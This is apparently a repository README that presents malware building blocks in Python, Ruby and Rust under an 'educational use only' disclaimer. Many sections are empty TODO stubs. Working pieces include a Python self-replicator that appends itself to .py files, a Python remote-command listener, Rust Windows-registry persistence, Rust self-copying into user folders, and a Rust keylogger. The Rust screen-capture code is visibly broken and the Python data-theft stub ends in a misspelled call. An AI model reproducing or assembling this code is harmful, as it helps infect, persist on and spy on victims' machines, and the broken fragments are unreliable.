# EthicalHacking_Viruses_Ransomware
Only intended for Educational Use

This repository contains code that shows the framework for various Malwares, and simple Trojans

# Virus Functionality Repository
This repository contains code and commands for various functionalities of a virus. These functionalities are for educational purposes only, and should not be used for any malicious purposes. The `.md` files includes the structures in different programming languages

# Disclaimer
The author of this repository is not responsible for any damage or harm caused by the use of this code or commands. Use at your own risk.

# Viruses using Python

## Functionalities

***1. Basic Virus Structure***
This code demonstrates a basic virus structure, including how to replicate itself, how to hide itself from detection, and how to execute malicious code.

``` py
# Basic Virus Structure in Python
import os

def replicate():
    virus_code = open(__file__).read()
    target_files = []
    for root, dirs, files in os.walk(os.getcwd()):
        for file in files:
            if file.endswith('.py'):
                target_files.append(os.path.join(root, file))
    for file in target_files:
        with open(file, 'a') as f:
            f.write(virus_code)

def hide():
    pass # TODO: add code for hiding the virus

def execute():
    pass # TODO: add code for executing malicious code

if __name__ == '__main__':
    replicate()
    hide()
    execute()
```

***2. Network Propagation***
This code demonstrates how to propagate the virus over a network, using a worm-like technique. The virus scans the network for vulnerable machines and infects them automatically.

``` py
# Network Propagation in Python
import socket
import subprocess
import os

def scan_network():
    ip = socket.gethostbyname(socket.gethostname())
    ip_parts = ip.split('.')
    for i in range(1, 255):
        target_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.{i}"
        if target_ip == ip:
            continue
        result = subprocess.call(['ping', '-n', '1', '-w', '500', target_ip])
        if result == 0:
            infect(target_ip)

def infect(target_ip):
    # TODO: add code for infecting the target machine
    pass

if __name__ == '__main__':
    scan_network()
```

***3. Remote Access***

This code demonstrates how to create a backdoor into a victim's computer, allowing remote access and control.

``` py
# Remote Access in Python
import socket
import subprocess
import os

def connect():
    s = socket.socket()
    s.bind(('0.0.0.0', 1234))
    s.listen(1)
    conn, addr = s.accept()
    print(f"Connection established with {addr[0]}")
    while True:
        command = input("Enter command: ")
        conn.send(command.encode())
        if command == 'exit':
            break
        output = conn.recv(1024)
        print(output.decode())

def run_command(command):
    result = subprocess.check_output(command, shell=True)
    return result

if __name__ == '__main__':
    connect()
```

***4. Data Theft***
This code demonstrates how to steal sensitive data from a victim's computer, including passwords, credit card details, and other private information.

``` py
# Data Theft in Python
import os

def steal_passwords():
    # TODO: add code for stealing passwords
    pass

def steal_credit_cards():
    # TODO: add code for stealing credit card details
    pass

def steal_private_info():
    # TODO: add code for stealing private information
    pass

if __name__ == '__main__':
    steal_password
```

***5.Email Spamming***
This code demonstrates how to send spam emails from a victim's computer, using their email account and address book.

``` py
# Email Spamming in Python
import smtplib
import email.message
import os

def spam_emails():
    # TODO: add code for spamming emails
    pass

if __name__ == '__main__':
    spam_emails()
```

***6. Denial of Service (DoS) Attack***
This code demonstrates how to launch a DoS attack on a target website, rendering it inaccessible to users.

``` py

# DoS Attack in Python
import socket
import time
import os

def launch_dos_attack():
    # TODO: add code for launching DoS attack
    pass

if __name__ == '__main__':
    launch_dos_attack()

```
# Conclusion
The code and commands provided in this repository are for educational purposes only. They should not be used for any malicious purposes, as doing so is illegal and can result in severe legal consequences. The author of this repository is not responsible for any damage or harm caused by the use of this code or commands. Use at your own risk.

# Virus Repository using Ruby

***1. Keylogging***

``` ruby

# Keylogger in Ruby
require 'logger'
require 'win32/api'

LOG_FILE_NAME = 'keylog.txt'
LOG_DIRECTORY = 'C:/logs/'

def log_keys
  # TODO: add code for logging keys
end

if __FILE__ == $0
  log_keys
end

```

***2. Screen Logging***

``` ruby
# Screen Logger in Ruby
require 'logger'
require 'win32/screenshot'

LOG_FILE_NAME = 'screenlog.txt'
LOG_DIRECTORY = 'C:/logs/'

def log_screens
  # TODO: add code for logging screens
end

if __FILE__ == $0
  log_screens
end
```

***3. File Encryption***
This code demonstrates how to encrypt files on a victim's computer.

``` ruby
# File Encryption in Ruby
require 'openssl'

ENCRYPTION_ALGORITHM = 'AES-256-CBC'
KEY_FILE_NAME = 'key.bin'

def encrypt_file(file_path)
  # TODO: add code for encrypting file
end

def generate_key
  # TODO: add code for generating encryption key
end

if __FILE__ == $0
  file_path = ARGV[0]
  encrypt_file(file_path)
end

```

***4.Backdoor Creation***
This code demonstrates how to create a backdoor on a victim's computer, allowing remote access.

``` ruby

# Backdoor Creation in Ruby
require 'socket'

PORT = 1234

def create_backdoor
  # TODO: add code for creating backdoor
end

if __FILE__ == $0
  create_backdoor
end

```

***5. Email Spamming***
This code demonstrates how to send spam emails from a victim's computer, using their email account and address book.

``` ruby
# Email Spamming in Ruby
require 'net/smtp'
require 'mail'
require 'os'

def spam_emails
  # TODO: add code for spamming emails
end

if __FILE__ == $0
  spam_emails
end
```

***6. Denial of Service (DoS) Attack***
This code demonstrates how to launch a DoS attack on a target website, rendering it inaccessible to users.

``` ruby

# DoS Attack in Ruby
require 'socket'
require 'time'
require 'os'

def launch_dos_attack
  # TODO: add code for launching DoS attack
end

if __FILE__ == $0
  launch_dos_attack
end

```

## Disclaimer: 
The code and commands provided in this repository are for educational purposes only. The author of this repository does not condone or support the use of this code or commands for any malicious or harmful purposes. Any use of this code or commands for malicious or harmful purposes is strictly prohibited and illegal.

# Virus Repository in Rust

This repository contains code and commands for various functionalities of a virus. These functionalities are for educational purposes only, and should not be used for any malicious purposes.

# Disclaimer
The author of this repository is not responsible for any damage or harm caused by the use of this code or commands. Use at your own risk.

# Persistence: 
Adds itself to the Windows registry to ensure it runs on startup

``` rs
use std::process::Command;
use winreg::enums::*;
use winreg::RegKey;

fn add_to_startup() -> Result<(), std::io::Error> {
    let key = RegKey::predef(HKEY_CURRENT_USER)
        .create_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")?;

    let exe_path = std::env::current_exe()?;
    let exe_file_name = exe_path.file_name().unwrap().to_str().unwrap();

    key.set_value(exe_file_name, &exe_path.to_str().unwrap())?;

    Ok(())
}

fn main() {
    // Code for the virus
    // ...

    // Add the virus to the Windows startup
    add_to_startup().unwrap();
}
```
This code creates a registry key at `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` and sets the value of the executable's filename to the path of the executable. This ensures that the virus will run on startup. Note that this code is specific to Windows and will not work on other operating systems. Also, the user must have sufficient privileges to modify the registry.

# Spreadability: 
creates copies of itself in various locations on the user's computer to increase its chance of executing

``` rs
use std::fs::copy;
use std::io::Result;
use std::path::PathBuf;

fn copy_to_location(virus_path: &PathBuf, location: &PathBuf) -> Result<()> {
    let new_path = location.join(virus_path.file_name().unwrap());

    copy(virus_path, new_path)?;

    Ok(())
}

fn spread_virus() -> Result<()> {
    let virus_path = std::env::current_exe()?;
    let virus_name = virus_path.file_name().unwrap();

    let desktop = PathBuf::from(std::env::var("USERPROFILE").unwrap() + "\\Desktop");
    copy_to_location(&virus_path, &desktop)?;

    let downloads = PathBuf::from(std::env::var("USERPROFILE").unwrap() + "\\Downloads");
    copy_to_location(&virus_path, &downloads)?;

    let temp = std::env::temp_dir();
    copy_to_location(&virus_path, &temp)?;

    Ok(())
}

fn main() {
    // Code for the virus
    // ...

    // Spread the virus
    spread_virus().unwrap();
}
```
# Keylogging

``` rs
// Keylogger in Rust
use std::fs::OpenOptions;
use std::io::Write;
use std::time::Duration;
use winapi::{
    ctypes::c_int,
    shared::{
        minwindef::{DWORD, LPARAM, WPARAM},
        ntdef::LPCWSTR,
        windef::HWND,
    },
    um::{winuser::GetForegroundWindow, winuser::GetWindowTextW},
};
use user32_sys::winuser::{
    GetAsyncKeyState, MapVirtualKeyW, MapVirtualKeyWParams, SendInput, SendInputParams,
    VirtualKeyCode,
};

const LOG_FILE_NAME: &str = "keylog.txt";

fn log_keys() {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(LOG_FILE_NAME)
        .unwrap();
    loop {
        std::thread::sleep(Duration::from_millis(10));
        for i in 0..255 {
            let state = unsafe { GetAsyncKeyState(i as c_int) };
            if (state & 1) == 1 {
                let mut buf = [0u16; 2];
                let mut params = MapVirtualKeyWParams {
                    uCode: i,
                    uMapType: 0,
                };
                unsafe {
                    MapVirtualKeyW(i, 0);
                    let _ = GetWindowTextW(GetForegroundWindow(), buf.as_mut_ptr(), 2);
                    let text = String::from_utf16_lossy(&buf);
                    let _ = write!(file, "[{}]: {}\n", text.trim(), i);
                }
            }
        }
    }
}

fn main() {
    log_keys();
}
```

# ** ScreenLogging**
``` rs
// Screen Logger in Rust
use std::fs::OpenOptions;
use std::io::{BufWriter, Write};
use std::time::Duration;
use winapi::{
    shared::{
        minwindef::{BOOL, DWORD, HBITMAP, HDC, LPARAM},
        ntdef::LPCWSTR,
        windef::{HDC__, HWND, RECT},
    },
    um::{
        wingdi::{
            BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject,
            GetDeviceCaps, GetObjectW, SelectObject, BITMAP, COLORREF, SRCCOPY,
        },
        winuser::GetDesktopWindow,
    },
};

const LOG_FILE_NAME: &str = "screenlog.txt";

fn log_screen() {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(LOG_FILE_NAME)
        .unwrap();
    let hwnd = unsafe { GetDesktopWindow() };
    let mut rect: RECT = Default::default();
    let hdc_screen = unsafe { GetDC(hwnd) };
    let hdc = unsafe { CreateCompatibleDC(hdc_screen) };
    let width = unsafe { GetDeviceCaps(hdc_screen, 8) };
let height = unsafe { GetDeviceCaps(hdc_screen, 10) };
let hbitmap = unsafe { SelectObject(hdc, CreateCompatibleBitmap(hdc_screen, width, height)) };
let mut bitmap: BITMAP = Default::default();
let _ = unsafe { GetObjectW(hbitmap as *mut _, std::mem::size_of::<BITMAP>(), &mut bitmap) };
let mut writer = BufWriter::new(file);
loop {
    std::thread::sleep(Duration::from_secs(10));
    unsafe { BitBlt(hdc, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY) };
    let mut written: DWORD = 0;
    let mut data: Vec<u8> = vec![0; (bitmap.bmWidth * bitmap.bmHeight * 4) as usize];
    let lp_bits: *mut u8 = data.as_mut_ptr();
    let bmi = std::mem::zeroed::<winapi::um::wingdi::BITMAPINFO>();
    let bmi_header = bmi.bmiHeader;
    bmi_header.biSize = std::mem::size_of::<winapi::um::wingdi::BITMAPINFOHEADER>() as u32;
    bmi_header.biWidth = bitmap.bmWidth;
    bmi_header.biHeight = bitmap.bmHeight;
    bmi_header.biPlanes = 1;
    bmi_header.biBitCount = 32;
    bmi_header.biCompression = winapi::um::wingdi::BI_RGB;
    let result = unsafe {
        GetDIBits(
            hdc_screen,
            hbitmap as winapi::um::winnt::HANDLE,
            0,
            bitmap.bmHeight as u32,
            lp_bits as *mut _,
            &bmi,
            winapi::um::winnt::DIB_RGB_COLORS,
        )
    };
    if result == 0 {
        break;
    }
    let color_bytes = 4;
    for row in data.chunks((bitmap.bmWidth * color_bytes) as usize) {
        writer.write_all(row).unwrap();
    }
    writer.flush().unwrap();
}
unsafe {
    DeleteObject(hbitmap as winapi::shared::windef::HGDIOBJ);
    DeleteDC(hdc);
    DeleteDC(hdc_screen);
}
}
fn main() {
log_screen();
}
```

# FileEncryption

``` rs
// File Encryption in Rust
use aes::Aes128;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;

type Aes128Cbc = Cbc<Aes128, Pkcs7>;

const BLOCK_SIZE: usize = 16;

fn encrypt_file(file_path: &str) {
    // TODO: add code for encrypting file
}

fn generate_key() {
    // TODO: add code for generating encryption key
}

fn main() {
    let file_path = std::env::args().nth(1).unwrap();
    encrypt_file(&file_path);
}
```

# Backdoor Creation

``` rs

// Backdoor Creation in Rust
use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write};

const PORT: u16 = 1234;

fn create_backdoor() {
    // TODO: add code for creating backdoor
}

fn main() {
    create_backdoor();
}
```

# Email Spamming

``` rs
// Email Spamming in Rust
use std::net::TcpStream;

fn spam_emails() {
    // TODO: add code for spamming emails
}

fn main() {
    spam_emails();
}
```

# Denial of Service (DoS) Attack

``` rs
// DoS Attack in Rust
use std::net::TcpStream;

fn launch_dos_attack() {
    // TODO: add code for launching DoS attack
}

fn main() {
    launch_dos_attack();
}
```

